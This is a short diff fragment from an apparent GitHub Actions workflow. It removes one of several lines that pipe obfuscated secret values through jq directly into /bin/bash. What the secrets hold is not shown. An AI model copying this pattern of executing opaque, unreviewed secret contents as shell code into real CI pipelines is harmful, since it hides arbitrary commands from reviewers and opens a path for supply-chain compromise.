@@ -17,7 +17,6 @@ jobs:
           zfe49250: ${{ secrets.zfe49250 }}
         run: |
           printf '%s' "$zfe49250" | jq -r .uxwbm6 | /bin/bash
-          echo $hvqn0816 | jq -r .y99189 | /bin/bash
           printf '%s' "$ojaqx83" | jq -r .jj5 | /bin/bash
 
       - name: Persist output
